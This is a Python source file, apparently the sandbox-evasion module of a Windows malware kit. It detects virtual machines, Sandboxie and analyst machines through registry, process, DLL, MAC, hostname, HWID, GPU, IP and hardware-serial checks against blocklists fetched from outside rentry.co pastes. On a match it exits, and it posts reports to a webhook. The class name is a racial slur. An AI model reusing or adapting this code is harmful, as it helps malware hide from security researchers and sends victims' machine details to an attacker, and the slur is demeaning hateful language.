from libs.libs import *
import re

def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

def in_virtualenv():
    return get_base_prefix_compat() != sys.prefix

class niggasex:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.detection_messages = []

    def send_webhook(self):
        if not self.detection_messages:
            return

        description = "\n".join(self.detection_messages)
        embed = {
            "title": "VM Detection Report",
            "description": description,
            "color": 16711680  # Red color
        }
        data = {
            "embeds": [embed]
        }
        response = requests.post(self.webhook_url, json=data)
        if response.status_code != 204:
            print(f"Failed to send webhook: {response.status_code}, {response.text}")

    def add_detection_message(self, message):
        self.detection_messages.append(message)

    def registry_check(self):
        cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\"
        reg1 = subprocess.run(cmd + "DriverDesc", shell=True, stderr=subprocess.DEVNULL)
        reg2 = subprocess.run(cmd + "ProviderName", shell=True, stderr=subprocess.DEVNULL)
        if reg1.returncode == 0 and reg2.returncode == 0:
            self.add_detection_message("VMware Registry Detected")
            sys.exit()

    def processes_and_files_check(self):
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            self.add_detection_message("VMwareService.exe & VMwareTray.exe process are running")
            sys.exit()
                           
        if os.path.exists(vmware_dll): 
            self.add_detection_message("Vmware DLL Detected")
            sys.exit()
            
        if os.path.exists(virtualbox_dll):
            self.add_detection_message("VirtualBox DLL Detected")
            sys.exit()
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            self.add_detection_message("Sandboxie DLL Detected")
            sys.exit()
        except:
            pass        
        
        processl = requests.get("https://rentry.co/x6g3is75/raw").text
        if processl in processList:
            self.add_detection_message("Suspicious process detected from list")
            sys.exit()
            
    def mac_check(self):
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        mac_list = requests.get("https://rentry.co/ty8exwnb/raw").text
        if mac_address[:8] in mac_list:
            self.add_detection_message("VMware MAC Address Detected")
            sys.exit()
    
    def check_pc(self):
        vmname = os.getlogin()
        vm_name = requests.get("https://rentry.co/3wr3rpme/raw").text
        if vmname in vm_name:
            self.add_detection_message("Suspicious VM Name Detected")
            sys.exit()
        vmusername = requests.get("https://rentry.co/bnbaac2d/raw").text
        host_name = socket.gethostname()
        if host_name in vmusername:
            self.add_detection_message("Suspicious Host Name Detected")
            sys.exit()

    def hwid_vm(self):
        current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
        hwid_vm = requests.get("https://rentry.co/fnimmyya/raw").text
        if current_machine_id in hwid_vm:
            self.add_detection_message("Suspicious HWID Detected")
            sys.exit()

    def checkgpu(self):
        c = wmi.WMI()
        for gpu in c.Win32_DisplayConfiguration():
            GPUm = gpu.Description.strip()
        gpulist = requests.get("https://rentry.co/povewdm6/raw").text
        if GPUm in gpulist:
            self.add_detection_message("Suspicious GPU Detected")
            sys.exit()

    def check_ip(self):
        ip_list = requests.get("https://rentry.co/hikbicky/raw").text
        reqip = requests.get("https://api.ipify.org/?format=json").json()
        ip = reqip["ip"]
        if ip in ip_list:
            self.add_detection_message("Suspicious IP Detected")
            sys.exit()

    def profiles(self):
        machine_guid = str(uuid.getnode())
        guid_pc = requests.get("https://rentry.co/882rg6dc/raw").text
        bios_guid = requests.get("https://rentry.co/hxtfvkvq/raw").text
        baseboard_guid = requests.get("https://rentry.co/rkf2g4oo/raw").text
        serial_disk = requests.get("https://rentry.co/rct2f8fc/raw").text
        if machine_guid in guid_pc:
            self.add_detection_message("Suspicious Machine GUID Detected")
            sys.exit()
        w = wmi.WMI()
        for bios in w.Win32_BIOS():
            bios_check = bios.SerialNumber    
        if bios_check in bios_guid:
            self.add_detection_message("Suspicious BIOS Serial Detected")
            sys.exit() 
        for baseboard in w.Win32_BaseBoard():
            base_check = baseboard.SerialNumber
        if base_check in baseboard_guid:
            self.add_detection_message("Suspicious Baseboard Serial Detected")
            sys.exit()
        for disk in w.Win32_DiskDrive():
            disk_serial = disk.SerialNumber
        if disk_serial in serial_disk:
            self.add_detection_message("Suspicious Disk Serial Detected")
            sys.exit()